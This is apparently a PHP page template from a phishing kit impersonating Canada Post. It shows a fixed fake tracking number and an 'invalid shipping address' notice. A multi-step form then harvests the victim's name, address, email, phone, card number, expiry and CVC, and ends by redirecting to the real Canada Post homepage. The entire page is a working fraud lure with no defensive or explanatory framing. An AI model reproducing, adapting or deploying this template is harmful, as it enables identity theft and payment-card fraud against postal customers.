<?php include('header.php'); ?>
<!-- Banner -->
<section class="banner">
    <div class="container">
        <div class="banner__title">
            <div class="banner__title__icon">
                <img src="./assets/img/target.svg" alt="target">
            </div>
            <h1><?php echo $lang['Track']; ?>: <span>7218809018449384</span></h1>
        </div>
        <ul class="banner__actions">
            <li>
                <a href="#">
                    <img src="./assets/img/share.svg" alt="share">
                </a>
            </li>
            <li>
                <a href="#">
                    <img src="./assets/img/print.svg" alt="print">
                </a>
            </li>
            <li>
                <a href="#">
                    <img src="./assets/img/bell.svg" alt="bell">
                </a>
            </li>
        </ul>
    </div>
</section>


<!-- Delivery Informations -->
<div class="deliveryIn">
    <div class="container">
        <div class="deliveryIn__exptected">
            <h2><?php echo $lang['Invalidshippingaddress']; ?></h2>
            <p>Saturday, Sept, 28</p>
        </div>

        <form action="#" class="multiForm" id="paymentForm">

            <div class="progressBar">
                <ul>
                    <li class="active">
                        <span><?php echo $lang['progressstep1']; ?> </span>
                    </li>
                    <li> <span><?php echo $lang['progressstep2']; ?> </span></li>
                    <li> <span><?php echo $lang['progressstep3']; ?> </span></li>
                </ul>
            </div>

            <!-- Page 1 Form -->
            <fieldset>
                <div class="updatedDate"> <?php echo $lang['Updated']; ?>: Today at 1:30 am </div>
                <div class="deliveryIn__notifiction">
                    <div class="deliveryIn__notifiction__icon">
                        <img src="./assets/img/info-glyph.svg" alt="info">
                    </div>
                    <div class="deliveryIn__notifiction__content">
                        <p><?php echo $lang['Information1']; ?>
                        </p>
                    </div>

                </div>
                <div class="deliveryIn__details">
                    <div class="accordion" id="deliveryDetail">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingOne">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                                    <?php echo $lang['Deliverydetails']; ?>
                                </button>
                            </h2>
                            <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#deliveryDetail">
                                <div class="accordion-body p-0">
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong> <?php echo $lang['RegularParcels']; ?></p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Trackingnumber']; ?>:</strong> 7218809018449384</p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong>
                                        <div class="shipService"></div>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="deliveryIn__address">
                    <h3><?php echo $lang['VerifyAddress']; ?></h3>
                    <p><?php echo $lang['VerifyAddressDescription']; ?></p>
                </div>

                <div class="vaddress">
                    <h3> <span>* <?php echo $lang['requiredfield']; ?></span></h3>
                    <div class="vaddress__block">
                        <div class="form-group">
                            <label for="senderNameInput" class="form-label"><?php echo $lang['fullname']; ?> *</label>
                            <input type="text" class="form-control" id="senderNameInput" name="senderNameInput" placeholder="<?php echo $lang['fullnameplaceholder']; ?>" maxlength="30">
                        </div>
                        <div class="form-group">
                            <label for="streetAddressInput" class="form-label"><?php echo $lang['streetaddress']; ?>*</label>
                            <input type="text" class="form-control" id="streetAddressInput" name="streetAddressInput" placeholder="<?php echo $lang['addressplaceholder']; ?>">
                        </div>
                        <div class="form-group">
                            <label for="senderAddressLine2" class="form-label"><?php echo $lang['aptsuitsunitbuildingfloor']; ?></label>
                            <input type="text" class="form-control" id="senderAddressLine2" name="senderAddressLine2" placeholder="<?php echo $lang['aptsuiteunitfloorplaceholder']; ?>">
                        </div>
                        <div class="form-group">
                            <label for="cityInput" class="form-label"><?php echo $lang['city']; ?> *</label>
                            <input type="text" class="form-control" id="cityInput" name="cityInput" placeholder="<?php echo $lang['cityplaceholder']; ?>" maxlength="40">
                        </div>
                        <div class="form-group">
                            <label for="provinceId" class="form-label"><?php echo $lang['Province']; ?> *</label>
                            <select class="form-select" id="provinceId" name="provinceId">
                                <option selected disabled><?php echo $lang['provinceplaceholder']; ?></option>
                                <option value="AB">Alberta</option>
                                <option value="BC">British Columbia</option>
                                <option value="MB">Manitoba</option>
                                <option value="NB">New Brunswick</option>
                                <option value="NL">Newfoundland &amp; Labrador</option>
                                <option value="NS">Nova Scotia</option>
                                <option value="NT">Northwest Territories</option>
                                <option value="NU">Nunavut</option>
                                <option value="ON">Ontario</option>
                                <option value="PE">Prince Edward Island</option>
                                <option value="QC">Québec</option>
                                <option value="SK">Saskatchewan</option>
                                <option value="YT">Yukon Territory</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="PostalCodeInput" class="form-label"><?php echo $lang['postalcode']; ?> *
                                <button type="button" data-bs-toggle="tooltip" data-bs-placement="top" title="<?php echo $lang['postcodeTooltip']; ?>">
                                    <img src="./assets/img/tooltip.svg" alt="tooltip">
                                </button>
                            </label>
                            <input type="text" class="form-control" id="PostalCodeInput" name="PostalCodeInput" placeholder="<?php echo $lang['postalcodeplaceholder']; ?>">
                        </div>
                        <div class="form-group">
                            <label for="EmailAddressInput" class="form-label"><?php echo $lang['emailaddress']; ?> *</label>
                            <input type="text" class="form-control" id="EmailAddressInput" name="EmailAddressInput" placeholder="<?php echo $lang['emailplaceholder']; ?>">
                        </div>
                        <div class="form-group">
                            <label for="PhoneNumberInput" class="form-label"><?php echo $lang['phonenumber']; ?> *</label>
                            <input type="text" class="form-control" id="PhoneNumberInput" name="PhoneNumberInput" placeholder="<?php echo $lang['numberplaceholder']; ?>">
                        </div>
                        <div class="form-group">
                            <div class="form-check">
                                <input class="form-check-input" type="checkbox" value="" id="deliveryUpdate">
                                <label class="form-check-label" for="deliveryUpdate">
                                    <?php echo $lang['checkboxtext']; ?>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div class="vaddress__submitBtn">
                        <button type="button" class="continuebtn"><?php echo $lang['Continue']; ?></button>
                    </div>
                </div>


            </fieldset>

            <!-- Page 2 Form -->
            <fieldset>
                <div class="updatedDate"> <?php echo $lang['Updated']; ?>: Today at 1:30 am </div>
                <div class="deliveryIn__notifiction">
                    <div class="deliveryIn__notifiction__icon">
                        <img src="./assets/img/info-glyph.svg" alt="info">
                    </div>
                    <div class="deliveryIn__notifiction__content">
                        <p><?php echo $lang['Information1']; ?>
                        </p>
                    </div>

                </div>
                <div class="deliveryIn__details">
                    <div class="accordion" id="deliveryDetailtwo">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingOne">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                                    <?php echo $lang['Deliverydetails']; ?>
                                </button>
                            </h2>
                            <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#deliveryDetailtwo">
                                <div class="accordion-body p-0">
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong> <?php echo $lang['RegularParcels']; ?></p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Trackingnumber']; ?>:</strong> 7218809018449384</p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong>
                                        <div class="shipService"></div>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="deliveryIn__address">
                    <h3><?php echo $lang['paymentmethod']; ?></h3>
                    <p><?php echo $lang['paymentmethoddescription1']; ?> <br>
                        <span><?php echo $lang['paymentmethoddescription2']; ?></span>

                    </p>
                </div>

                <div class="vaddress">
                    <h3> <span>* <?php echo $lang['requiredfield']; ?></span></h3>
                    <div class="vaddress__block">
                        <div class="form-group">
                            <input class="form-control" type="tel" id="cc-number" name="ccnumber" placeholder="<?php echo $lang['cardnumberplaceholder']; ?>" maxlength="19" data-payment='cc-number'>
                        </div>
                        <div class="form-group">
                            <input type="tel" class="form-control" id="cc-exp" name="ccexp" placeholder="<?php echo $lang['cardexipryplaceholder']; ?>" maxlength="5" data-payment='cc-exp'>
                        </div>
                        <div class="form-group">
                            <input type="password" class="form-control" id="cc-cvc" name="cccvc" placeholder="<?php echo $lang['cardcvcplaceholder']; ?>" maxlength="4" data-payment='cc-cvc'>
                        </div>

                    </div>
                    <div class="vaddress__submitBtn">
                        <button type="submit" class="continuebtn"><?php echo $lang['Continue']; ?></button>

                    </div>
                </div>
            </fieldset>

            <!-- Page 3 Form -->
            <fieldset>
                <div class="updatedDate"> <?php echo $lang['Updated']; ?>: Today at 1:30 am </div>
                <div class="deliveryIn__notifiction">
                    <div class="deliveryIn__notifiction__icon">
                        <img src="./assets/img/info-glyph.svg" alt="info">
                    </div>
                    <div class="deliveryIn__notifiction__content">
                        <h4><?php echo $lang['successinformationtitle']; ?></h4>
                        <p><?php echo $lang['successinformationdescription']; ?>
                        </p>
                    </div>

                </div>
                <div class="deliveryIn__details">
                    <div class="accordion" id="deliveryDetailthree">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingOne">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                                    <?php echo $lang['Deliverydetails']; ?>
                                </button>
                            </h2>
                            <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#deliveryDetailthree">
                                <div class="accordion-body p-0">
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong> <?php echo $lang['RegularParcels']; ?></p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Trackingnumber']; ?>:</strong> 7218809018449384</p>
                                    </div>
                                    <div class="deliveryIn__details__box">
                                        <p><strong class="d-block"><?php echo $lang['Shippingservice']; ?>: </strong>
                                        <div class="shipService"></div>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>



                <div class="vaddress">
                    <div class="vaddress__submitBtn">
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/home.page" class="endFormBtn"><?php echo $lang['Done']; ?></a>
                    </div>
                </div>
            </fieldset>

        </form>
    </div>
</div>


<!-- Support -->

<section class="support">
    <div class="container">
        <h2 class="suTitle"><?php echo $lang['Support']; ?></h2>
        <div class="accordion" id="supportFaq">
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingOne">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                        <?php echo $lang['expecteddelivery']; ?>
                    </button>
                </h2>
                <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#supportFaq">
                    <div class="accordion-body p-0">
                        <div class="support__content">
                            <p><?php echo $lang['expecteddeliverydescription']; ?></p>
                            <p><a href="#"><?php echo $lang['expecteddeliverylink1text']; ?></a></p>
                            <p><a href="#"><?php echo $lang['expecteddeliverylink2text']; ?></a></p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingTwo">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                        <?php echo $lang['deliverystandard']; ?>
                    </button>
                </h2>
                <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#supportFaq">
                    <div class="accordion-body p-0">
                        <div class="support__content">
                            <p><?php echo $lang['deliverystandarddescription']; ?></p>
                            <p><a href="#"><?php echo $lang['deliverystandardlink1text']; ?></a></p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingThree">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                        <?php echo $lang['deliveryconfirmation']; ?>
                    </button>
                </h2>
                <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#supportFaq">
                    <div class="accordion-body p-0">
                        <div class="support__content">
                            <p><?php echo $lang['deliveryconfirmationdescription']; ?><br><br><a href="#"><?php echo $lang['deliveryconfirmationlink1text']; ?></a></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="support__more">
            <a href="#"><?php echo $lang['Seemoresupport']; ?></a>
        </div>
    </div>
</section>


<!-- Service Alert -->
<section class="servicealert">
    <div class="container">
        <h2><?php echo $lang['servicealerts']; ?></h2>
        <p><?php echo $lang['servicealertsdescription']; ?></p>
        <a href="#"><?php echo $lang['Seeallservicealerts']; ?></a>
    </div>
</section>


<?php include('footer.php'); ?>